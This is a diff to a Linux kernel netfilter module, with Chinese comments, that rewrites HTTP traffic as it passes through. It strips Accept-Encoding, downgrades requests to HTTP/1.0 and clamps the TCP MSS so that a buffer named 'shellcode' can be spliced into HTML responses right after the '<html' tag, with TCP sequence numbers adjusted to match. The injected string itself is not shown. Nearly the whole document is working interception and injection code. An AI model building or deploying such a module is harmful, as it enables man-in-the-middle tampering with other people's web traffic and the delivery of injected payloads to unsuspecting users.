@@ -1,21 +1,23 @@
 /* netfilter修改HTTP数据包（插入、修改、删除） */
 
 // 测试内核：3.13.0-32-generic
+// sudo apt-get install linux-headers-3.13.0-32 linux-headers-3.13.0-32-generic linux-image-3.13.0-32-generic linux-image-extra-3.13.0-32-generic
+
 // 修改数据包长度后3.13内核可自动修改seq和ack
-// 3.2以及2.68以下内核只是在ct->status中高几位做了标记（IPS_SEQ_ADJUST_BIT），还需要后续手动hook修改
+// 2.68以下内核只是在ct->status中高几位做了标记（IPS_SEQ_ADJUST_BIT），还需要后续手动hook修改
 
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
 #include <linux/if_packet.h>
 #include <linux/skbuff.h>
 
+#include <net/ip.h>
+#include <net/tcp.h>
+
 #include <net/netfilter/nf_conntrack_helper.h>
 #include <net/netfilter/nf_conntrack_seqadj.h>
-
 #include <net/netfilter/nf_nat_helper.h>
 
 MODULE_LICENSE("GPL");
@@ -52,26 +54,99 @@ int delete_accept_encoding(char *pkg)
 	return 1;
 }
 
+/*
+	当握手时修改本次TCP连接MSS值，使插入数据后长度仍小于MTU 
+*/
+static inline u32 set_tcp_mss(struct sk_buff *pskb, struct tcphdr  *tcph, u16 mtu)  
+{  
+    u32 optlen, i;  
+    u8  *op;  
+    u16 newmss, oldmss;  
+    u8  *mss;  
+  
+    if ( !tcph->syn )  
+        return 0;  
+  
+    // 判断是否为合法tcp选项  
+    if (tcph->doff*4 < sizeof(struct tcphdr))  
+        return 0;  
+  
+    optlen = tcph->doff*4 - sizeof(struct tcphdr);  
+    if (!optlen)  
+        return 0;  
+  
+    // 扫描是否有MSS选项  
+    op = ((u8*)tcph + sizeof(struct tcphdr));  
+    for (i = 0; i < optlen; ) {  
+        if (op[i] == TCPOPT_MSS  && (optlen - i) >= TCPOLEN_MSS  && op[i+1] == TCPOLEN_MSS) {  
+            u16 mssval;  
+            //newmss = htons( 1356 );  
+            oldmss = (op[i+3] << 8) | op[i+2];  
+            mssval = (op[i+2] << 8) | op[i+3];  
+              
+            // 是否小于MTU-( iphdr + tcphdr )  
+            if ( mssval > mtu - 40 ) {  
+                newmss = htons( mtu - 40 );   
+            }  
+            else {  
+                break;  
+            }  
+        //   
+        mss = &newmss;  
+        op[i+2] = newmss & 0xFF;  
+        op[i+3] = (newmss & 0xFF00) >> 8;  
+        // 计算checksum  
+        inet_proto_csum_replace2( &tcph->check, pskb,  
+            oldmss, newmss, 0);  
+          
+        mssval = (op[i+2] << 8) | op[i+3];  
+        printk(KERN_ALERT "hook_ipv4: Change TCP MSS %d to %d\n", ntohs( oldmss ), ntohs( newmss ) );  
+        break;  
+              
+        }  
+        if (op[i] < 2)  
+            i++;  
+        else  
+            i += op[i+1] ? : 1;  
+    }  
+    return 0;  
+}  
+
 // 钩子函数，发送时修改请求头，接收时修改pkg
 unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
 {
-	// IP数据包frag合并
-	if (0 != skb_linearize(skb)) {
-		return NF_ACCEPT;
-	}
 	struct iphdr *iph = ip_hdr(skb);
 
 	if (iph->protocol == IPPROTO_TCP)
 	{	
-		struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
+		// IP frag合并
+		/* skb_linearize - convert paged skb to linear one
+		* If there is no free memory -ENOMEM is returned, otherwise zero
+		* is returned and the old skb data released.
+		* 这一步很关键，否则后面根据 包头偏移计算出来 payload 得到东西不是正确的包结构
+		* 2.6 以上内核需要这么做。 因为新的系统可能为了提高性能，一个网络包的内容是分成几个 fragments 来保存的
+		* 这时 单单根据 skb->data 得到的只是包的第一个 fragments 的东西。我见到我系统上的就是 tcp 头部和 tcp 的 payload
+		* 是分开保存在不同的地方的。可能 ip,tcp 头部等是后面系统层才加上的，和应用程序的 payload 来源不一样，使用不同的 fragments就
+		* 可以避免复制数据到新缓冲区的操作提高性能。skb_shinfo(skb)->nr_frags 属性指明了这个 skb 网络包里面包含了多少块 fragment了。
+		* 具体可以看 《Linux Device Drivers, 3rd Editio》一书的 17.5.3. Scatter/Gather I/O 小节
+		* 《Understanding_Linux_Network_Internals》 一书 Chapter 21. Internet Protocol Version 4 (IPv4): Transmission 一章有非常详细的介绍
+		* 下面使用的 skb_linearize 函数则可以简单的把 多个的 frag 合并到一起了，我为了简单就用了它。
+		*/
 
-		// unsigned int saddr = (unsigned int)iph->saddr;
-		// unsigned int daddr = (unsigned int)iph->daddr;
+		if (0 != skb_linearize(skb)) {
+			return NF_ACCEPT;
+		}
+		struct tcphdr *tcph = tcp_hdr(skb);
+
+		unsigned int saddr = (unsigned int)iph->saddr;
+		unsigned int daddr = (unsigned int)iph->daddr;
 
 		unsigned int sport = (unsigned int)ntohs(tcph->source);
 		unsigned int dport = (unsigned int)ntohs(tcph->dest);
 
 		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
+
+		unsigned int tcplen = skb->len - (iph->ihl*4) - (tcph->doff*4);
 
 		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &saddr, sport, &daddr, dport);
 
@@ -83,7 +158,7 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 			{
 				return NF_ACCEPT;
 			}
-			// 找到页面源码中插入位置（示例中为head后面）
+			// 找到页面源码中插入位置（示例中为<html>后面）
 			char *phead = strstr(pkg,">");
 			if(phead == NULL) return NF_ACCEPT;
 
@@ -92,6 +167,7 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 
 			pK = strstr(pkg,"<html");
 			if(pK == NULL)	return NF_ACCEPT;
+
 			// 尝试不使用nf_nat_mangle_tcp_packet，手动扩容
 			// -------------------------------------------------
 			// skb扩容，在尾部增加strlen(shellcode)长度
@@ -132,21 +208,23 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 			// 		   unsigned int match_len,
 			// 		   const char *rep_buffer,
 			// 		   unsigned int rep_len)
-			if (ct && nf_nat_mangle_tcp_packet(skb, 
+			if (ct && __nf_nat_mangle_tcp_packet(skb, 
 						ct, 
 						ctinfo,
 						iph->ihl * 4, 
 						(int)(phead - pkg) + 1, 
 						0,
 						shellcode, 
-						strlen(shellcode))) 
+						strlen(shellcode), true)) 
 			{
-				printk(KERN_ALERT "hook_ipv4: ---pkg modify success---\n");
+				printk(KERN_ALERT "hook_ipv4: ---pkg modify success--- tcplen: %d %d\n", tcplen, (skb->len > ip_skb_dst_mtu(skb) && !skb_is_gso(skb)));
+				// ip_finish_output(skb);
 		  	}
 		}
 		// 发出的数据包
 		else if (dport == 80)
 		{
+			set_tcp_mss(skb, tcph, 1500 - strlen(shellcode));
 			// 请求头HTTP 1.1 --> HTTP 1.0
 			// 防止收到chunked数据包（Transfer-Encoding： chunked是HTTP 1.1中特有的）
 			char *pK = strstr(pkg,"HTTP/1.1");
@@ -181,9 +259,8 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 	return NF_ACCEPT;
 }
 
-// 3.2以及2.68以下内核适用
 // ==========================================================================
-// 3.2以及2.68以下内核中，以下三个函数由于内核没有导出符号，需要手动把实现粘贴过来的
+// 2.68以下内核中，以下三个函数由于内核没有导出符号，需要手动把实现粘贴过来的
 // ------------------------------------------------------------------
 // 1---
 /* Adjust one found SACK option including checksum correction */
